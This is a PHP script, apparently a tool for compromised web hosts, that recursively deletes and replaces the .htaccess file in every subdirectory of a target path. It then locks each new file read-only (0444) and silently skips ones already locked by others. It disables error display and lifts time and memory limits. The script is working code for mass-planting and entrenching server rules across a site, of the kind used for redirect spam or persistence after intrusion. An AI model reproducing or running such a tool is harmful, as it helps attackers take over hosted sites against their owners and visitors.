<?php
/*
 * PROFESSIONAL MASS HTACCESS DEPLOYER V5 (FINAL FIX)
 */
set_time_limit(0);
ini_set('memory_limit', '-1');
ini_set('display_errors', 0);

$message = "";
$report = []; // Array ini HANYA menampung path yang di-SKIP (yang ada 0444 nya)
$stats = ['success' => 0, 'locked' => 0, 'fail' => 0];

// Logic Pemrosesan (TIDAK DIUBAH SAMA SEKALI)
if (isset($_POST['execute'])) {
    $sourceFile = trim($_POST['source_file']);
    $baseDir = rtrim(trim($_POST['base_dir']), '/'); 

    if (!file_exists($sourceFile)) {
        $message = "<div class='alert error'>Error: File sumber (.htaccess) tidak ditemukan!</div>";
    } elseif (!is_dir($baseDir)) {
        $message = "<div class='alert error'>Error: Direktori target tidak valid!</div>";
    } else {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $item) {
                if ($item->isDir()) {
                    $currentDir = $item->getPathname();
                    $targetFile = $currentDir . '/.htaccess';
                    
                    $isLocked = false;

                    // 1. CEK APAKAH ADA FILE DAN STATUSNYA 0444
                    if (file_exists($targetFile)) {
                        $perms = substr(sprintf('%o', fileperms($targetFile)), -4);
                        if ($perms == '0444') {
                            $isLocked = true;
                        }
                    }

                    if ($isLocked) {
                        // KONDISI SKIP:
                        // Karena ada 0444, kita JANGAN timpa.
                        // DAN KITA MASUKKAN KE LAPORAN (REPORT).
                        $stats['locked']++;
                        $report[] = [
                            'path' => $currentDir, 
                            'status' => 'SKIPPED (FOUND EXISTING 0444)', 
                            'class' => 'locked'
                        ];
                    } else {
                        // KONDISI EKSEKUSI (TIMPA):
                        // Karena tidak ada 0444, kita hajar (timpa).
                        // Dan file baru kita set jadi 0444.
                        // TIDAK MASUK LAPORAN (Silent).
                        
                        // Hapus file lama jika ada (biar bersih)
                        if(file_exists($targetFile)) { @unlink($targetFile); }

                        if (@copy($sourceFile, $targetFile)) {
                            @chmod($targetFile, 0444); // SET HASIL COPY JADI 0444
                            $stats['success']++;
                        } else {
                            $stats['fail']++; // Gagal write permission folder
                        }
                    }
                }
            }
            
            // Pesan status akhir
            if ($stats['locked'] > 0) {
                 $message = "<div class='alert warning'>SELESAI. SYSTEM REPORT: " . $stats['locked'] . " PATH DI-SKIP (LOCKED 0444). LIHAT LOG DI BAWAH.</div>";
            } else {
                 $message = "<div class='alert success'>SELESAI. SEMUA TARGET BERHASIL DITIMPA (100% SUCCESS).</div>";
            }

        } catch (Exception $e) {
            $message = "<div class='alert error'>CRITICAL SYSTEM ERROR: " . $e->getMessage() . "</div>";
        }
    }
}

// Auto-fill path
$defaultBase = getcwd();
$defaultSource = $defaultBase . '/example/.htaccess';
